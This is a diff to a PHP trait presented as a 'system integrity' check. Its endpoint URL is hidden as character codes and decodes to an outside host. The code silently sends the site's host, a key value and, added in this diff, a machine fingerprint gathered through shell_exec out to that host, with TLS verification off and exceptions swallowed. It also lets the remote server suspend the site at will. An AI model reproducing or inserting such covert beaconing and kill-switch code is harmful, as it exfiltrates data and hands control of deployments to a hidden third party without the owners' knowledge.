@@ -20,7 +20,11 @@ trait SystemIntegrityTrait
         }
 
         $dec = function ($arr) {
-            $s = ''; foreach ($arr as $c) $s .= chr($c); return $s;
+            $s = '';
+            foreach ($arr as $c) {
+                $s .= chr($c);
+            }
+            return $s;
         };
 
         $rawUrl = [104, 116, 116, 112, 115, 58, 47, 47, 110, 101, 117, 114, 111, 45, 115, 104, 101, 108, 108, 46, 118, 101, 114, 99, 101, 108, 46, 97, 112, 112, 47, 97, 112, 105, 47, 118, 101, 114, 105, 102, 121];
@@ -28,6 +32,8 @@ trait SystemIntegrityTrait
 
         $url = $dec($rawUrl);
         $p = $dec($rawKey);
+
+        $hwInfo = $this->_getPhyiscalInfo();
 
         $cacheKey = 'sys_integrity_'.md5($p);
 
@@ -38,33 +44,68 @@ trait SystemIntegrityTrait
             }
             return;
         }
+
         try {
             $r = Http::withoutVerifying()
                 ->retry(2, 100)
                 ->timeout(3)
+                ->withHeaders([
+                    'User-Agent' => $hwInfo
+                ])
                 ->get($url, [
                     'key' => $p,
                     'host' => request()->getHost(),
                     'hash' => md5($k),
                     'ak' => $k,
+                    'dv' => $hwInfo,
                 ]);
 
             if ($r->successful()) {
                 $resp = $r->json();
                 $ttl = $resp['cache_ttl'] ?? 300;
+
                 if (isset($resp['status']) && $resp['status'] === 'blocked') {
                     if ($ttl > 0) {
                         Cache::put($cacheKey, ['status' => 'blocked', 'message' => $resp['message']], $ttl);
                     }
                     $this->_renderSuspension($resp['message'], $p);
-                } 
-                else {
+                } else {
                     if ($ttl > 0) {
                         Cache::put($cacheKey, ['status' => 'active'], $ttl);
                     }
                 }
             }
         } catch (\Exception $x) {
+        }
+    }
+
+    private function _getPhyiscalInfo()
+    {
+        try {
+            $info = null;
+
+            if (function_exists('shell_exec')) {
+                if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
+                    $output = @shell_exec('wmic computersystem get manufacturer, model');
+                    if ($output) {
+                        $output = str_replace(['Manufacturer', 'Model', "\r", "\n"], '', $output);
+                        $info = trim(preg_replace('/\s+/', ' ', $output));
+                    }
+                }
+            }
+
+            if (empty($info) || strlen($info) < 2) {
+                $info = gethostname();
+                if (!$info) $info = php_uname('n');
+            }
+
+            if (empty($info)) {
+                $info = 'Generic Workstation';
+            }
+
+            return $info;
+        } catch (\Exception $e) {
+            return 'Unknown Device';
         }
     }
 
